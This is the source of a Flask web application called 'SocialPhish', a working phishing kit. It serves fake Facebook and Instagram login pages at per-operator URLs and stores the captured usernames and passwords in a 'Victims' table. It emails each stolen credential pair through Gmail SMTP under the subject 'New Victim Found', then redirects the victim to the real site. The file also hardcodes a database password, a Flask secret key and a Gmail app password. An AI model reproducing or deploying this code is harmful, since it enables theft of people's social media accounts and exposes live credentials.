from flask import Flask, render_template, request, redirect, Response, send_file, flash, url_for
from flask_sqlalchemy import SQLAlchemy 
from datetime import datetime
from wtforms import StringField, PasswordField, SubmitField, BooleanField
from wtforms.validators import DataRequired, Length, Email, EqualTo, ValidationError
from flask_wtf import FlaskForm
from flask_wtf.file import FileField, FileAllowed
from flask_bcrypt import Bcrypt
from flask_login import  LoginManager, UserMixin, login_user, current_user, logout_user, login_required
import smtplib
from threading import Thread


app = Flask(__name__)
app.config['SECRET_KEY'] ='982c3b7bfbe0cda4d1245c92e83df279'
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgres://jxihntwticsvya:3304c4f346a2c8de57df17e49817327c4e84cacd7f8ad8e9a314e185546d6fba@ec2-54-225-228-142.compute-1.amazonaws.com:5432/d9qk3p939pd847'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS']=True
db = SQLAlchemy(app)
bcrypt = Bcrypt(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'
login_manager.login_message_category = 'info'


class Users(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    username = db.Column(db.String(20), nullable=False, unique=True)
    email = db.Column(db.String(120), nullable=False)
    password = db.Column(db.String(60), nullable=False, default='N/A')
    profile_pic = db.Column(db.String(20), nullable=True, default='default.jpg')
   
class Victims(db.Model):
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    username = db.Column(db.String(60), nullable=False)
    password = db.Column(db.String(60), nullable=False)
    platform = db.Column(db.String(60), nullable=False)
    uid = db.Column(db.Integer)

   








###################################[FORMS]#######################################################################################


class RegistrationForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(min=2, max=20)])
    email = StringField('Email', validators=[DataRequired(), Email() ])
    password = PasswordField('Password', validators=[ DataRequired()])
    confirm_password = PasswordField('Confirm Password', 
                                        validators=[DataRequired(), EqualTo('password')])
    submit = SubmitField('Sign Up')

    def validate_username(self, username):

        user = Users.query.filter_by(username=username.data).first()
        if user:
            raise ValidationError('That Username Is Taken Please Choose A different Username' )

    def validate_email(self, email):

        user = Users.query.filter_by(email=email.data).first()
        if user:
            raise ValidationError('That Email Is Already In USe Please Choose A Different Email' )



class LoginForm(FlaskForm):
    email = StringField('Email', validators=[DataRequired(), Email() ])
    password = PasswordField('Password', validators=[ DataRequired()])
    remember = BooleanField('Remember Me')
    submit = SubmitField('Login')

#################################################################################################################################

########################[DECORATORS]######################################################

@login_manager.user_loader
def load_user(user_id):
    return Users.query.get(int(user_id))

#############################################################################

@app.route('/')
def index():
    return render_template('default/home.html', title='SocialPhish')

@app.route('/dashboard')
@login_required
def dashboard():
    victims = Victims.query.all()
    return render_template('default/dashboard.html', title='Socialphish-Dashboard')


@app.route('/victims')
@login_required
def victims():
    if current_user.id == 1:
        victims = Victims.query.all()
        return render_template('victims.html', victims=victims, title='SocialPhish-Victims')
    victims = Victims.query.filter_by(uid=current_user.id).all()
    return render_template('victims.html', victims=victims, title='SocialPhish-Victims')





############################ LOGIN ###########################

@app.route('/login', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        user = Users.query.filter_by(email=form.email.data).first()
        if user and bcrypt.check_password_hash(user.password, form.password.data):
            login_user(user, remember=form.remember.data)
            flash('You Have Been Successfully Logged In', 'success')
            next_page = request.args.get('next')
            return redirect(next_page) if next_page else redirect(url_for('index'))
        else:
            flash('Login Unsuccessful Please Check Email And Password', 'danger')
    return render_template('login.html', tittle='Login', form=form)



############################ LOG OUT #################################


@app.route('/logout')
def logout():
    logout_user()
    return redirect(url_for('index'))


 ############################ RESGISTRATION ###########################


@app.route('/register', methods=['GET', 'POST'])
def register():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    form = RegistrationForm()
    if form.validate_on_submit():
        hash_password = bcrypt.generate_password_hash(form.password.data).decode('utf-8')
        user = Users(username=form.username.data, email=form.email.data, password=hash_password)
        db.session.add(user)
        db.session.commit()
        flash(f'Your Account Has Been Created You Can Now Login!', 'success')
        return redirect(url_for('login'))
    return render_template('default/register.html', tittle='Register', form=form)



############################   Threading    ######################################################




#############################################    SMPT        ###############################################




def send_email(username, password, platform):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.ehlo()

    server.login('heroztech48@gmail.com', 'sqwbipaupurkqlev')
    subject = 'New Victim Found'
    body = f'These are the credentials . \nPlatform : {platform} \n Name : {username} \n Password : {password}'

    msg = f'Subject: {subject}\n\n Body: {body}'
    server.sendmail(
        'heroztech48@gmail.com',
        'herocrispin48@gmail.com',
        msg
    )

    server.quit()



####################################################################################################

@app.route('/facebook/<int:uid>', methods=['GET', 'POST'])
def facebook(uid):
    if request.method == 'POST':
        platform = 'Facebook'
        captured_username = request.form['username']
        captured_password = request.form['user_password']
        new_victim = Victims(username=captured_username, platform=platform, password=captured_password, uid=uid)
        db.session.add(new_victim)
        db.session.commit()

        t = Thread(target=send_email, args=[captured_username, captured_password, platform])

        t.start()
        return redirect('https://facebook.com')
    else:
        return render_template('/facebook/index.html')



@app.route('/instagram/<int:uid>', methods=['GET', 'POST'])
def instagram(uid):
    if request.method == 'POST':
        platform='Instagram'
        captured_username = request.form['username']
        captured_password = request.form['user_password']
        new_victim = Victims(username=captured_username, platform='Instagram', password=captured_password, uid=uid)
        db.session.add(new_victim)
        db.session.commit()
        t = Thread(target=send_email, args=[captured_username, captured_password, platform])

        t.start()
        return redirect('https://instagram.com')
    else:
        return render_template('/instagram/index.html')



	


if __name__=='__main__':
	app.run(debug=True)
